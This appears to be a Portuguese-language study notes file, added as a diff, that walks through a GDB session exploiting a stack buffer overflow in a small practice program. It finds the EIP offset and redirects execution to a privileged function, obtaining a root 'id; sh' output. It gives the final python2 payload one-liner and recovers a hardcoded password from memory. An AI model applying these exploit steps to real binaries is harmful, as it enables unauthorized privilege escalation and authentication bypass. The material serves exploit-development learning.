@@ -1,0 +1,264 @@
+
+# ver as funcoes
+info funcions
+
+# fazer disassembly na funcao
+disas main
+
+# ver na sintaxe da intel
+set disassembly-flavor intel
+
+# setar breakpoint depois da funcao gets
+b* 0x5655621f
+
+# executar com comando
+run < <(python2 -c 'print "A" * 150')
+
+# ver os registradores
+i r
+
+# examinar a memoria em esp
+x/16xw $esp
+
+# ver 1 byte em ebp
+x/1xw $ebp 
+###### eip vem depois de ebp
+
+# 0xffffd350:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd360:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd370:     0x41414141      0xf7004141      0x00000000      0xf7c23295
+# 0xffffd380:     0x00000000      0x00000070      0xf7ffcff4      0xf7c23295
+# (gdb) x/1xw $ebp
+# 0xffffd368:     0x41414141
+
+# neste exemplo, o ebp foi sobrescrito e o endereco é ffffd368 que é (linha 2 coluna 3)
+
+
+#apertar "c" para continar
+c
+
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x41414141 in ?? ()
+
+# neste caso, o eip foi sobrescrito com AAAA ou seja, os \x41 como mostrado 
+# no endereco de memoria acima (ffffd369 no caso)
+
+# fazendo um i r veremos os enderecos na memoria
+
+# (gdb) i r
+# eax            0x0                 0
+# ecx            0xf7e1e9b8          -136189512
+# edx            0x1                 1
+# ebx            0x41414141          1094795585
+# esp            0xffffd370          0xffffd370
+# ebp            0x41414141          0x41414141
+# esi            0x56556330          1448436528
+# edi            0xf7ffcb80          -134231168
+# eip            0x41414141          0x41414141
+# eflags         0x10282             [ SF IF RF ]
+# cs             0x23                35
+# ss             0x2b                43
+# ds             0x2b                43
+# es             0x2b                43
+# fs             0x0                 0
+# gs             0x63                99
+
+
+# (lea) isto quer dizer que esta alocando um espaco na memoria
+# 0x88 em hexa ou 136 em decimal
+
+# 0x56556213 <+42>:    lea    eax,[ebp-0x88]
+
+# vamos enviar entao 136 bytes A e mais 4 bytes B
+run < <(python2 -c 'print "A" * 136 + "BBBB"')
+
+# vamos ver o que ha em ebp
+x/1xw $ebp
+# 0xffffd368:     0x42424242
+
+
+# olhando novamente em esp podemos ver que atingimos ebp
+
+# (gdb) x/16xw $esp
+# 0xffffd2d0:     0xffffd2e0      0x00000001      0xf7fc14a0      0x565561f8
+# 0xffffd2e0:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd2f0:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd300:     0x41414141      0x41414141      0x41414141      0x41414141
+# (gdb) 
+# 0xffffd310:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd320:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd330:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd340:     0x41414141      0x41414141      0x41414141      0x41414141
+# (gdb) 
+# 0xffffd350:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd360:     0x41414141      0x41414141      0x42424242      0x56556300
+# 0xffffd370:     0xffffd390      0xf7e1cff4      0x00000000      0xf7c23295
+# 0xffffd380:     0x00000000      0x00000070      0xf7ffcff4      0xf7c23295
+
+# ebp encontra-se no grupo 3, na linha 2, na coluna 3 com os 42424242
+
+# sabemos entao que basta enviar mais 4 bytes para atingir eip e controlar o programa
+
+# (gdb) x/16xw $esp
+# 0xffffd2d0:     0xffffd2e0      0x00000001      0xf7fc14a0      0x565561f8
+# 0xffffd2e0:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd2f0:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd300:     0x41414141      0x41414141      0x41414141      0x41414141
+# (gdb) 
+# 0xffffd310:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd320:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd330:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd340:     0x41414141      0x41414141      0x41414141      0x41414141
+# (gdb) 
+# 0xffffd350:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xffffd360:     0x41414141      0x41414141      0x42424242      0x56556300
+# 0xffffd370:     0xffffd390      0xf7e1cff4      0x00000000      0xf7c23295
+# 0xffffd380:     0x00000000      0x00000070      0xf7ffcff4      0xf7c23295 
+
+# podemos ver tambem somente o ebp
+x/1xw $ebp
+# 0xffffd368:     0x42424242
+
+# vamos continar o programa para testar se vai para os 43 mesmo
+c
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x43434343 in ?? ()
+
+# perfeito, controlamos eip
+# agora so localizar o endereco da funcao que queremos redirecionar o programa
+# e colocar nos C
+
+#   .....
+#   0x56556269 <+128>:   add    esp,0x10
+#   0x5655626c <+131>:   test   eax,eax
+#   0x5655626e <+133>:   jne    0x56556277 <verifica+142>
+#   0x56556270 <+135>:   call   0x56556293 <acessa>
+#   0x56556275 <+140>:   jmp    0x56556289 <verifica+160>
+#   0x56556277 <+142>:   sub    esp,0xc
+#   0x5655627a <+145>:   lea    eax,[ebx-0x1fbb]
+#   0x56556280 <+151>:   push   eax
+#   0x56556281 <+152>:   call   0x56556060 <puts@plt>
+#   0x56556286 <+157>:   add    esp,0x10
+#   0x56556289 <+160>:   mov    eax,0x0
+#   0x5655628e <+165>:   mov    ebx,DWORD PTR [ebp-0x4]
+#   0x56556291 <+168>:   leave  
+#   0x56556292 <+169>:   ret  
+
+# podemos ver que tem uma call com o endereco 0x56556270 para funcao acessa
+# podemos entao colocar esse endereco em eip
+
+# executamos agora o seguinte comando
+# o endereco precisa estar invertido, entao 0x56556270 sera 0x70625556
+run < <(python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"')
+
+o programa para no breakpoint e entao podemos dar um continue (c)
+c
+# Continuing.
+# Entre com a senha: Acesso Negado
+# Bem vindo! 
+# [Detaching after vfork from child process 27644]
+# uid=0(root) gid=0(root) grupos=0(root)
+
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x5655628e in verifica ()
+
+
+# nosso exploit entao para essa aplicacao seria
+python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"'
+
+# podemos passar isso direto para a aplicacao
+python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"' | ./protegido
+
+# -------------------------------------------------------
+# truques no debugger
+
+# ver os enderecos nos registadores
+i r
+
+# podemos ja alterar o endereco de um registrador para uma funcao especifica 
+set $eip = 0x56556270 
+
+# ao fazermos um i r novamente, veremos a alteracao
+i r
+
+# para deletar os breakpoints
+d
+
+
+# vamos descobrir a senha do programa
+disas verifica
+
+# ...
+# 0x56556264 <+123>:   call   0x56556030 <strcmp@plt>
+# 0x56556269 <+128>:   add    esp,0x10
+# 0x5655626c <+131>:   test   eax,eax
+# 0x5655626e <+133>:   jne    0x56556277 <verifica+142>
+# 0x56556270 <+135>:   call   0x56556293 <acessa>
+# 0x56556275 <+140>:   jmp    0x56556289 <verifica+160>
+# 0x56556277 <+142>:   sub    esp,0xc
+# 0x5655627a <+145>:   lea    eax,[ebx-0x1fbb]
+# 0x56556280 <+151>:   push   eax
+# 0x56556281 <+152>:   call   0x56556060 <puts@plt>
+# 0x56556286 <+157>:   add    esp,0x10
+# 0x56556289 <+160>:   mov    eax,0x0
+# 0x5655628e <+165>:   mov    ebx,DWORD PTR [ebp-0x4]
+# 0x56556291 <+168>:   leave  
+# 0x56556292 <+169>:   ret
+
+# coloar um breakpoint bem no jne, ou seja, 0x5655626e
+b* 0x5655626e
+
+# executar o programa
+run
+
+# vamos ver os enderecos na memoria
+i r
+# eax            0xffffffff          -1
+# ecx            0x70                112
+# edx            0xffffd2e0          -11552
+# ebx            0x56559000          1448448000
+# esp            0xffffd2e0          0xffffd2e0
+# ebp            0xffffd368          0xffffd368
+# esi            0x56556330          1448436528
+# edi            0xf7ffcb80          -134231168
+# eip            0x5655626e          0x5655626e <verifica+133>
+# eflags         0x286               [ PF SF IF ]
+# cs             0x23                35
+# ss             0x2b                43
+# ds             0x2b                43
+# es             0x2b                43
+# fs             0x0                 0
+# gs             0x63                99
+
+
+# proxima funcao esta no eip
+
+# vamos examinar a memoria no registrador eip mas agora mostrando em string
+x/20s $eip
+# vamos dando enter (descendo ate achar as strings)
+
+# ...
+# 0x56556ffc:     ""
+# 0x56556ffd:     ""
+# 0x56556ffe:     ""
+# 0x56556fff:     ""
+# 0x56557000 <_fp_hw>:    "\003"
+# 0x56557002 <_fp_hw+2>:  ""
+# 0x56557003 <_fp_hw+3>:  ""
+# 0x56557004 <_IO_stdin_used>:    "\001"
+# 0x56557006 <_IO_stdin_used+2>:  "\002"
+# 0x56557008:     "Entre com a senha: "
+# 0x5655701c:     "123"
+# 0x56557020:     "Essa senha foi desativada!"
+# 0x5655703b:     "pr0t3g1d0"
+# 0x56557045:     "Acesso Negado"
+# (gdb) 
+# 0x56557053:     "Bem vindo! "
+# 0x5655705f:     "id; sh"
+# 0x56557066:     "Sem argumentos! "
+# 0x56557077:     ""
+# 0x56557078:     "\001\033\003;P"
+# 0x5655707e:     ""
+# 0x5655707f:     ""
+
+
